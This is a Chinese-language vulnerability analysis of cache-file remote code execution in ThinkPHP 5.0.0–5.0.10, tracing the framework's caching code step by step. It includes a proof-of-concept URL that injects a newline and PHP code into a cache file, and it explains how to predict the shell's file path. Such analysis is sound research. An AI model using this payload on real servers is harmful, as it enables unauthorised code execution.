# Thinkphp缓存rce

### 影响版本

---

> thinkphp5.0.0-5.0.10

# 正文

----

这篇文章是基于thinkphp5.0.0-5.0.10缓存文件命令执行的文章

首先在application/index/controller/index.php里面写入

```
public function index()
{
    Cache::set("namSe",input("get.username"));
    return 'Cache success';
}
```

然后访问：http://localhost:85/public/index.php/Index/index?username=pasec123%0D%0Aphpinfo();//

就可以写入缓存文件shell，从而达到命令执行的目的

![](https://s2.loli.net/2022/08/08/sKB5NAj3qolpzke.png)

![2](https://s2.loli.net/2022/08/08/xfkoZ6rwU1ARcgE.png)

![3](https://s2.loli.net/2022/08/08/3ktHUbwqSoFcmh8.png)

###  开始调试

---

从第一步Cache的set方法跟进，首先进入set方法：

```
public static function set($name, $value, $expire = null)
{
    self::$writeTimes++;
    return self::init()->set($name, $value, $expire);
}
```



$writeTimes默认为0，进入init方法，首先判断self::\handler是否为空，之后进入Config::get方法



```
public static function init(array $options = [])
{
    if (is_null(self::$handler)) {
        // 自动初始化缓存
        if (!empty($options)) {
            $connect = self::connect($options);
        } elseif ('complex' == Config::get('cache.type')) {
            $connect = self::connect(Config::get('cache.default'));
        } else {
            $connect = self::connect(Config::get('cache'));
        }
        self::$handler = $connect;
    }
    return self::$handler;
}
```

![](https://s2.loli.net/2022/08/08/ybzKsJjGHIp4imB.png)

传入的name值为cache.type，从这里可以看出type值为File

![](https://s2.loli.net/2022/08/08/Y8rbfM3ViTjvJ1h.png)

走完get方法后可以得到的有：

name[0] => cache，name[1] => type，cache.type => File

![](https://s2.loli.net/2022/08/08/Cptzd9UTNsSofi4.png)

之后进入connect方法，这里的type获取的就是\$option['type']也就是File



```
public static function connect(array $options = [], $name = false)
{
    $type = !empty($options['type']) ? $options['type'] : 'File';
    if (false === $name) {
        $name = md5(serialize($options));
    }
```



将\$option序列化后md5加密，序列化的\$name值和md5后的分别为：

![](https://s2.loli.net/2022/08/08/JrikEaWeZzcV8qx.png)

![8](https://s2.loli.net/2022/08/08/FpPDbgUYOrsGv85.png)

connect方法返回的内容为：

![](https://s2.loli.net/2022/08/08/t574CmYe8HDoIcU.png)

走到这里也就直接返回init方法中的值

![](https://s2.loli.net/2022/08/08/KxH5YLw2PFidpov.png)

set方法判断\$expire值是否为空，为空的话就将option中的expire值赋给它，option中的值为0，那么\$expire => 0，继续往下走进入getCacheKey方法，这里缓存类设置的键名为name，将name进行md5加密，前两位为目录名，后面位数为文件名，创建php缓存文件

这里比较困扰的是之前\$name的值已经经过了md5加密，所以想当然的认为这里的\$name是加密后的值，但是回到最初index.php中，会发现已经设置了值为name，也就是加密name，name就可以轻松的猜测出路径以及文件名，所以获取缓存键名才能找到shell的路径

![](https://s2.loli.net/2022/08/08/KSp9qokg4JnTbMB.png)

```
protected function getCacheKey($name)
{
    $name = md5($name);
    if ($this->options['cache_subdir']) {
        // 使用子目录
        $name = substr($name, 0, 2) . DS . substr($name, 2);
    }
    if ($this->options['prefix']) {
        $name = $this->options['prefix'] . DS . $name;
    }
    $filename = $this->options['path'] . $name . '.php';
    $dir      = dirname($filename);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    return $filename;
}
```



之后回到set方法，将value值进行序列化，但是并没有进行其他的过滤操作

![](https://s2.loli.net/2022/08/08/crGA2JuevHXySxf.png)

再看下面的数据压缩，因为option中的data_compress默认为false，因此也就不会进入gzcompress方法

![](https://s2.loli.net/2022/08/08/Qa6UWYKTBVEL5rm.png)

虽然使用注释符//对数据进行注释，但是仍然可以使用换行符进行绕过，之后使用file_put_contents写入shell

![](https://s2.loli.net/2022/08/08/IujhF5rblW4TgBY.png)